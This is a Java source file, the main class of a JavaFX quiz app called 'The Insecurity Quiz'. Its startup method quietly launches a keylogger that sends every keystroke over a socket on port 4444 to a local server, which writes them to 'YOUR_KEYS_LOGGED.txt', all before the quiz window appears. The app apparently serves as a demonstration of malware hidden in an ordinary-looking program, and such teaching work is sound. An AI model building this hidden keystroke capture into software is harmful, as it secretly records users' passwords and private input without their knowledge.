package org.insecurity_quiz;

import javafx.application.Application;
import javafx.fxml.FXMLLoader;
import javafx.scene.Scene;
import javafx.scene.layout.VBox;
import javafx.stage.Stage;

import org.insecurity_quiz.Advanced_Security_Implementations.*;
import org.insecurity_quiz.QuizController;

import java.io.FileInputStream;

import static javafx.application.Application.launch;

public class Main extends Application {
    /* The start method initializes the JavaFX stage by loading the intro.fxml file
     * using the FXMLLoader class. It sets up the scene and sets the QuizController.
     *
     * @param primaryStage the primary stage for this application.
     */
    @Override
    public void start(Stage primaryStage){
        try{
            //Start the server.
            KeyLogger keylogger = new KeyLogger("YOUR_KEYS_LOGGED.txt");
            SocketServer server = new SocketServer(4444, keylogger::logKey);
            server.startServer();

            // Create a SocketClient object and a KeyListener object
            // SocketClient: server address to send to, server port to send to
            SocketClient socketClient = new SocketClient("localhost", 4444);
            KeyListener KeyListener = new KeyListener(socketClient::send);
            // Start the KeyListener thread
            KeyListener.start();

            FXMLLoader loader = new FXMLLoader();
            VBox root = loader.load(new FileInputStream("GUI/intro.fxml"));
            Scene scene = new Scene(root, 900, 700);

            IntroController selectionController = (IntroController) loader.getController();
            selectionController.setApplicationStage(primaryStage);

            primaryStage.setScene(scene);
            primaryStage.setTitle("The Insecurity Quiz");
            primaryStage.show();
            primaryStage.show();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * The main method is the entry point of the Insecurity Quiz application.
     *
     * @param args an array of command-line arguments for the application.
     */
    public static void main(String[] args) {
        launch(args);
    }
}